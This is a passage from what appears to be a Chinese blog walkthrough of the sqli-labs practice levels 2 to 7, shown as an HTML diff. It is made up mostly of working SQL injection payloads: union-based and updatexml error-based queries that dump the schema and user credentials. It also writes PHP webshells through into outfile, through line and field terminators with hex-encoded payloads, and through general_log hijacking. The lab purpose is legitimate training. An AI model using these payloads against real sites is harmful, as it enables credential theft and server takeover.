+</blockquote>
+<p>得出所有列名为<br>
+<strong> email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username</strong><br>
+ 如果只想获得 uesr 表中的列名，方便我们查找的话，可以继续添加一些内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27;  and table_name = &#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:id,password,username<br>
+Your Password:3</p>
+</blockquote>
+<p>得出 users 表中的列名为<strong> id,password,username</strong></p>
+<h4 id="得出users表中的所有username和password"><a class="markdownIt-Anchor" href="#得出users表中的所有username和password">#</a> 得出 users 表中的所有 username 和 password</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin</p>
+</blockquote>
+<p>按顺序对应 username 和 password<br>
+ 如果想更好的查看对应的 username 和 password<br>
+ 可以添加 limit 0,1 将 group_concat () 删去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,username,password from users limit 0,1 --+</span><br><span class="line">limit 1,1</span><br><span class="line">limit 2,1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>通过这样的方法就能得到所有的 username 和 password</p>
+<h4 id="写入webshell"><a class="markdownIt-Anchor" href="#写入webshell">#</a> 写入 webshell</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less2]);?&gt;&#x27; into outfile &#x27;C:/less2.php&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>这样能在 c 盘中找到 less2.php 文件<br>
+内容就为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_POST[Less2]);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="sqli-labs-3"><a class="markdownIt-Anchor" href="#sqli-labs-3">#</a> sqli-labs-3</h2>
+<h4 id="初步判断-2"><a class="markdownIt-Anchor" href="#初步判断-2">#</a> 初步判断</h4>
+<h5 id="判断一下是否回显"><a class="markdownIt-Anchor" href="#判断一下是否回显">#</a> 判断一下是否回显</h5>
+<p>输入正确的 url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:Dumb<br>
+Your Password:Dumb</p>
+</blockquote>
+<p>说明会回显</p>
+<h5 id="判断需要闭合什么符号"><a class="markdownIt-Anchor" href="#判断需要闭合什么符号">#</a> 判断需要闭合什么符号</h5>
+<p>在 url 后面添加’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>说明我们需要闭合一个)</p>
+<h5 id="判断是什么型注入"><a class="markdownIt-Anchor" href="#判断是什么型注入">#</a> 判断是什么型注入</h5>
+<p>运用 and 1=1 和 1=2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 --+</span><br></pre></td></tr></table></figure>
+<p>此时页面异常，说明是数字型注入</p>
+<h4 id="获取列数"><a class="markdownIt-Anchor" href="#获取列数">#</a> 获取列数</h4>
+<p>用 order by 1，order by 2 … 直至 order by 4<br>
+ 此时报错<br>
+页面显示</p>
+<blockquote>
+<p>Unknown column ‘4’ in ‘order clause’</p>
+</blockquote>
+<p>从而可得知列数有三列</p>
+<h4 id="获取数据库名称"><a class="markdownIt-Anchor" href="#获取数据库名称">#</a> 获取数据库名称</h4>
+<p>用联合注入 union select 判断哪些字段会回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:2<br>
+Your Password:3</p>
+</blockquote>
+<p>得到 2，3 字段会回显后直接用 database () 获取数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:security<br>
+Your Password:3</p>
+</blockquote>
+<p>得到数据库名称为 security</p>
+<h4 id="获取所有表名"><a class="markdownIt-Anchor" href="#获取所有表名">#</a> 获取所有表名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:emails,referers,uagents,users<br>
+Your Password:3</p>
+</blockquote>
+<p>得到数据库的所有表名为<strong> emails,referers,uagents,users</strong></p>
+<h4 id="获取数据库中users表的所有列名"><a class="markdownIt-Anchor" href="#获取数据库中users表的所有列名">#</a> 获取数据库中 users 表的所有列名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username<br>
+Your Password:3</p>
+</blockquote>
+<p>得到 users 表中的所有列名</p>
+<h4 id="爆出users表中的所有username和password"><a class="markdownIt-Anchor" href="#爆出users表中的所有username和password">#</a> 爆出 users 表中的所有 username 和 password</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin</p>
+</blockquote>
+<p>依次对应各个 username 和 password</p>
+<h4 id="写入webshelll"><a class="markdownIt-Anchor" href="#写入webshelll">#</a> 写入 webshelll</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less3]);?&gt;&#x27; into outfile &#x27;C:/Less3.php&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>可以在路径中找到 Less3.php，里面的内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_POST[Less3]);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="sqli-labs-4"><a class="markdownIt-Anchor" href="#sqli-labs-4">#</a> sqli-labs-4</h2>
+<h4 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h4>
+<p>如果字段本身是 int 类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。<br>
+如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id = &quot;1&#x27;m&quot;</span><br></pre></td></tr></table></figure>
+<p>学习连接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/119684515">https://blog.csdn.net/elephantxiang/article/details/119684515</a></p>
+<h4 id="初步判断-3"><a class="markdownIt-Anchor" href="#初步判断-3">#</a> 初步判断</h4>
+<p>输入正确的 id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:Dumb<br>
+Your Password:Dumb</p>
+</blockquote>
+<p>说明会回显<br>
+输入’<br>
+发现页面没有报错<br>
+接着输入 &quot;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot;</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;”) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>由此可知，本题的闭合为 &quot;)</p>
+<p>有 and 1=1 和 and1=2 判断是字符型注入还是数字型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot;) and 1=2 --+</span><br></pre></td></tr></table></figure>
+<p>此时页面显示异常，说明是数字型注入</p>
+<h4 id="判断列数"><a class="markdownIt-Anchor" href="#判断列数">#</a> 判断列数</h4>
+<p>order by 1/2/3/4<br>
+4 时报错，内容和前三关一致，这里就一一列出</p>
+<h4 id="判断回显字段"><a class="markdownIt-Anchor" href="#判断回显字段">#</a> 判断回显字段</h4>
+<p>用联合注入 union select 1,2,3，然后 2,3 回显这里也不一一列出了</p>
+<h4 id="获取数据库名称-2"><a class="markdownIt-Anchor" href="#获取数据库名称-2">#</a> 获取数据库名称</h4>
+<p>在可回显的字段里换成 database ()<br>
+union select 1,database(),3<br>
+ 也和前三关一样也就不一一列出了<br>
+得到数据库名称为 database ()</p>
+<h4 id="获取所有的数据"><a class="markdownIt-Anchor" href="#获取所有的数据">#</a> 获取所有的数据</h4>
+<p>这里的操作和前三关都一样就不一一列出了</p>
+<h2 id="sqli-labs-5"><a class="markdownIt-Anchor" href="#sqli-labs-5">#</a> sqli-labs-5</h2>
+<h4 id="本关涉及内容"><a class="markdownIt-Anchor" href="#本关涉及内容">#</a> 本关涉及内容</h4>
+<h5 id="updatexml"><a class="markdownIt-Anchor" href="#updatexml">#</a> updatexml()</h5>
+<p>updatexml(xml_doument,XPath_string,new_value)<br>
+ 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc<br>
+ 第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。<br>
+第三个参数：new_value，String 格式，替换查找到的符合条件的数据</p>
+<p>updatexml(xml_doument,XPath_string,new_value)<br>
+ 第一个参数：XML 的内容<br>
+第二个参数：是需要 update 的位置 XPATH 路径<br>
+第三个参数：是更新后的内容<br>
+所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式<br>
+函数利用和语法明白了，下面注入的 payload 就清楚明白</p>
+<p><strong>updatexml 最多只能显示 32 位，需要配合 SUBSTR 使用</strong></p>
+<h5 id="concat"><a class="markdownIt-Anchor" href="#concat">#</a> concat()</h5>
+<p>用于连接字符串</p>
+<h5 id="substr"><a class="markdownIt-Anchor" href="#substr">#</a> substr()</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(strings|express,m,[n])</span><br></pre></td></tr></table></figure>
+<p>strings|express ：被截取的字符串或字符串表达式<br>
+ m ：从第 m 个字符开始截取<br>
+ n ：截取后字符串长度为 n</p>
+<h5 id="select-distinct"><a class="markdownIt-Anchor" href="#select-distinct">#</a> select distinct()</h5>
+<p>这个函数本关可以不用到，但是看到了就把他记下来<br>
+用法如下：</p>
+<blockquote>
+<p>SELECT DISTINCT 表示查询结果中，去掉了重复的行</p>
+</blockquote>
+<p>百度的一个例子：<br>
+如果要从 “Company” 列中选取所有的值，我们需要使用 SELECT 语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Company FROM Orders</span><br></pre></td></tr></table></figure>
+<p><strong>Orders</strong></p>
+<table>
+<thead>
+<tr>
+<th>Company</th>
+<th>Num</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IBM</td>
+<td>3532</td>
+</tr>
+<tr>
+<td>W3School</td>
+<td>2356</td>
+</tr>
+<tr>
+<td>Apple</td>
+<td>4698</td>
+</tr>
+<tr>
+<td>W3School</td>
+<td>6953</td>
+</tr>
+</tbody>
+</table>
+<p><strong>结果</strong></p>
+<table>
+<thead>
+<tr>
+<th>Company</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IBM</td>
+</tr>
+<tr>
+<td>W3School</td>
+</tr>
+<tr>
+<td>Apple</td>
+</tr>
+<tr>
+<td>W3School</td>
+</tr>
+<tr>
+<td>请注意，在结果集中，W3School 被列出了两次。</td>
+</tr>
+<tr>
+<td>如需从 Company&quot; 列中仅选取唯一不同的值，我们需要使用 SELECT DISTINCT 语句：</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT Company FROM Orders</span><br></pre></td></tr></table></figure>
+<p><strong>结果</strong></p>
+<table>
+<thead>
+<tr>
+<th>Company</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IBM</td>
+</tr>
+<tr>
+<td>W3School</td>
+</tr>
+<tr>
+<td>Apple</td>
+</tr>
+</tbody>
+</table>
+<p>在结果集中，“W3School” 仅被列出了一次。</p>
+<h4 id="初步判断-4"><a class="markdownIt-Anchor" href="#初步判断-4">#</a> 初步判断</h4>
+<p>输入正确的 id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>You are in…</p>
+</blockquote>
+<p>说明本关不回显<br>
+添加’后，发现页面还是会报错的</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>可以看出本关还是单引号闭合</p>
+<h4 id="获取数据库名称-3"><a class="markdownIt-Anchor" href="#获取数据库名称-3">#</a> 获取数据库名称</h4>
+<p>这里用到报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<p>此时页面显示</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>security</sub>’</p>
+</blockquote>
+<p>得到数据库名称为<strong> security</strong></p>
+<h4 id="获取所有表名-2"><a class="markdownIt-Anchor" href="#获取所有表名-2">#</a> 获取所有表名</h4>
+<p>这里用到 updatexml ()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<p>因为 updatexml () 函数只能显示 32 位，防止一次性爆出所有表名太长了这里使用 substr () 限制输出的位数<br>
+页面显示</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>emails,referers,uagents,users</sub>’</p>
+</blockquote>
+<p>得到所有的表名为<strong> emails,referers,uagents,users</strong></p>
+<h4 id="获取users所有列名"><a class="markdownIt-Anchor" href="#获取users所有列名">#</a> 获取 users 所有列名</h4>
+<p>这里采用 limit 0,1 限制一次性爆出列名的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>id</sub>’</p>
+</blockquote>
+<p>按顺序增加<br>
+ limit 1,1<br>
+limit 2,1<br>
+…<br>
+ 直到页面异常<br>
+可以得出所有的列名为<strong> id,username,password</strong></p>
+<p>这里再尝试一下 group_concat 看看能不能一次性爆出所有的列名，看网上的教程说报错注入不能使用 group_concat 一次性获取所有的列名，尝试一下会出现什么情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=&#x27;security&#x27;),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>id,username,password</sub>’</p>
+</blockquote>
+<p>得出还是能正常使用并得出所有列名的，我猜测应该是 updatexml () 只能显示 32 位，刚好这些列名没有超出 32 位就没有什么问题了<br>
+这里有使用 updatexml () 和 group_conat () 来获取 users 表里的所有 username 来验证一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(0x7e,(select group_concat(username)),0x7e) from users),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>XPATH syntax error: ‘~~Dumb,Angelina,Dummy,secure,stu’</p>
+</blockquote>
+<p>很明显可以看出 username 没有完全爆出，这里数了一下’‘里的内容确实只有 32 位<br>
+证明我的想法可能是对的’<doge>’<br>
+好了，回归正题</doge></p>
+<h4 id="获取所有username和password"><a class="markdownIt-Anchor" href="#获取所有username和password">#</a> 获取所有 username 和 password</h4>
+<p>既然上面验证了 updatexml 和 group_concat 同时使用可能会发生的事情，这里就不会 “误入歧途” 了<br>
+直接用 limit 依次获取所有的 username 和 password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(select (select concat(username,0x7e,password)) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>Dumb</sub>Dumb~’</p>
+</blockquote>
+<p>得出第一组 username 和 password 为 Dumb 和 Dumb<br>
+ 下面就不一一列出了就是 limit 1,1、limit 2,1 按顺序加上去就好了</p>
+<h4 id="写入webshell-2"><a class="markdownIt-Anchor" href="#写入webshell-2">#</a> 写入 webshell</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;C:/less5.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e --+</span><br></pre></td></tr></table></figure>
+<p>这里的这串 16 进制 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e 通过 16 进制转字符串可翻译为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_POST[less5]);?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="写入webshell归纳"><a class="markdownIt-Anchor" href="#写入webshell归纳">#</a> 写入 webshell 归纳</h4>
+<h5 id="1-union-select写入"><a class="markdownIt-Anchor" href="#1-union-select写入">#</a> 1、union select 写入</h5>
+<p>这是最常见的写入方式，union 跟 select into outfile，将一句话写入 shell.php，仅适用于<strong>联合注入</strong><br>
+条件：secure_file_priv 支持 web 目录文件导出，数据库 File 权限，获取物理路径<br>
+命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;])?&gt;&quot; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\cmd.php&#x27; --+</span><br></pre></td></tr></table></figure>
+<h5 id="lines-terminated-by写入"><a class="markdownIt-Anchor" href="#lines-terminated-by写入">#</a> Lines terminated by 写入</h5>
+<p>当 mysql 注入点为<strong>盲注或报错</strong>，Union select 写入是不能利用的，那么可以通过分隔符写入，SQLMAP 的–os-shell 命令，所采用的就是这种方式<br>
+条件：secure_file_priv 支持 web 目录文件导出，数据库 File 权限，获取物理路径<br>
+命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\321.php&#x27; lines terminated by &#x27;&lt;?php phpinfo(); ?&gt;&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>注入原理：通过 select 语句查询的内容写入文件，也就是 1’ into outfile 'E:\phpStudy\PHPTutorial\WWW\DVWA-master\aaa.php’这样写的原因，然后利用 lines terminated by 语句进行拼接，拼接后面的 webshell 内容</p>
+<h5 id="3-lines-starting-by写入"><a class="markdownIt-Anchor" href="#3-lines-starting-by写入">#</a> 3、lines starting by 写入</h5>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\123.php&#x27; lines starting by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>注入原理：利用 lines starting by 语句进行拼接，拼接后面的 webshell 内容，lines starting by 可以理解成以每行开始的位置添加 xx 语句</p>
+<h5 id="4-fields-terminated-by写入"><a class="markdownIt-Anchor" href="#4-fields-terminated-by写入">#</a> 4、fields terminated by 写入</h5>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\kuku.php&#x27; fields terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>注入原理：利用 fields terminated by 语句进行拼接，拼接后面的 webshell 内容，fields terminated by 可以理解为以每个字段的位置添加 xx 内容</p>
+<h5 id="5-columns-terminated-by写入"><a class="markdownIt-Anchor" href="#5-columns-terminated-by写入">#</a> 5、COLUMNS terminated by 写入</h5>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\hao.php&#x27; COLUMNS terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--</span><br></pre></td></tr></table></figure>
+<p>注入原理：利用 COLUMNS terminated by 语句进行拼接，拼接后面的 webshell 内容，COLUMNS terminated by 可以理解为以每个字段的位置添加 xx 内容</p>
+<h5 id="6-利用log写入"><a class="markdownIt-Anchor" href="#6-利用log写入">#</a> 6、利用 log 写入</h5>
+<p>新版本的 MYSQL 设置了导出文件的路径，很难在获取 webshell 过程中去修改配置的文件，无法通过使用 select into outfile 来写入一句话，这时我们可以通过修改 MYSQL 的 log 文件来获取 Webshell<br>
+ 条件：数据库用户需具备 Super 和 File 服务器的权限，获取物理路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;                        #查看配置</span><br><span class="line">set global general_log = on;                            #开启general log模式</span><br><span class="line"> set global general_log_file = &#x27;E:/phpStudy/PHPTutorial/WWW/DVWA-master/evil.php&#x27;;    #设置日志目录为shell地址</span><br><span class="line">select &#x27;&lt;?php phpinfo() ?&gt;&#x27;                     #写入shell</span><br><span class="line">set global general_log=off;                             #关闭general log模式</span><br></pre></td></tr></table></figure>
+<p>写入 webshell 学习于：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bring_coco/article/details/114756692">https://blog.csdn.net/bring_coco/article/details/114756692</a></p>
+<h2 id="sqli-labs-6"><a class="markdownIt-Anchor" href="#sqli-labs-6">#</a> sqli-labs-6</h2>
+<h4 id="初步判断-5"><a class="markdownIt-Anchor" href="#初步判断-5">#</a> 初步判断</h4>
+<p>输入正确的 id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>You are in…</p>
+</blockquote>
+<p>说明本关不回显<br>
+添加’,&quot;后发现&quot; 输入后页面显示报错</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;” LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>说明需要闭合的是双引号</p>
+<h4 id="获取数据库名称-4"><a class="markdownIt-Anchor" href="#获取数据库名称-4">#</a> 获取数据库名称</h4>
+<p>使用报错注入得到数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>security</sub>’</p>
+</blockquote>
+<p>从而得知数据库名称为<strong> security</strong></p>
+<h4 id="获取所有表名-3"><a class="markdownIt-Anchor" href="#获取所有表名-3">#</a> 获取所有表名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>emails,referers,uagents,users</sub>’</p>
+</blockquote>
+<p>得到所有的表名为<strong> emails,referers,uagents,users</strong></p>
+<h4 id="获取users表中的所有列名"><a class="markdownIt-Anchor" href="#获取users表中的所有列名">#</a> 获取 users 表中的所有列名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>id,username,password</sub>’</p>
+</blockquote>
+<p>得到 users 表中的所有列名为<strong> id,username,password</strong></p>
+<h4 id="获取users表中的所有username和password"><a class="markdownIt-Anchor" href="#获取users表中的所有username和password">#</a> 获取 users 表中的所有 username 和 password</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,(select (concat(username,&#x27;^&#x27;,password)) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>XPATH syntax error: ‘<sub>Dumb^Dumb</sub>’</p>
+</blockquote>
+<p>改变 limit 后面的数字 limit 1,1、limit 2,1 。。。<br>
+获取所有的 username 和 password</p>
+<h4 id="写入webshell-3"><a class="markdownIt-Anchor" href="#写入webshell-3">#</a> 写入 webshell</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; into outfile &#x27;C:/less6.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373365d293b203f3e --+</span><br></pre></td></tr></table></figure>
+<p>可以在相关路径找到对应 php 文件，0x 开头的十六进制符号可以用 16 进制转字符翻译</p>
+<h2 id="sqli-labs-7"><a class="markdownIt-Anchor" href="#sqli-labs-7">#</a> sqli-labs-7</h2>
+<h4 id="初步判断-6"><a class="markdownIt-Anchor" href="#初步判断-6">#</a> 初步判断</h4>
+<p>输入正确的 id</p>
